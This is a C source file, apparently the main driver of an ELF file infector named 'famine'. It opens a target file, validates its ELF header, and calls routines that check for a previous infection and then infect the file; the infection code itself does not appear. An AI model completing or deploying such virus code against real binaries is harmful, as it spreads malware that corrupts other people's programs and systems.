#include "../incl/famine.h"

int ft_readelf(t_famine *famine)
{
    famine->elf = mmap(NULL, famine->file_info.st_size, PROT_READ, MAP_PRIVATE, famine->fd, 0);
    if (famine->elf == MAP_FAILED)
    {
        close(famine->fd);
        return (-1);
    }
    if (famine->file_info.st_size >= 4 && famine->elf[0] == 0x7F && famine->elf[1] == 'E' && famine->elf[2] == 'L' && famine->elf[3] == 'F')
    {
        famine->type = 1;
        famine->file_size = famine->file_info.st_size;
        famine->header = (Elf64_Ehdr *)famine->elf;
    }
    else
    {
        close(famine->fd);
        return (-1);
    }
    return (0);
}

int ft_checkarg(t_famine *famine)
{
    famine->fd = open(famine->file, O_RDONLY);
    if (famine->fd == -1)
        return(errno == EISDIR ? -2 : -1);
    if (fstat(famine->fd, &famine->file_info) == -1)
    {
        close(famine->fd);
        return (-1);
    }
    if (S_ISDIR(famine->file_info.st_mode))
    {
        close(famine->fd);
        return (-1);
    }
    return (ft_readelf(famine));
}

int main(int argc, char **argv, char **env)
{
    t_famine    *famine;

    if (argc != 2)
        return (1);

    famine = malloc(sizeof(t_famine));
    if (!famine)
        return (1);
    famine->env = env;
    famine->file = argv[1];
    if (ft_checkarg(famine))
    {
        free(famine);
        return (1);
    }

    ft_pointer_section_table(famine);
    ft_pointer_strings_table(famine);
    ft_printheader(famine);

    if (ft_detect_prev_infection(famine))
        ft_infect(famine);
    free(famine);
    return (0);
}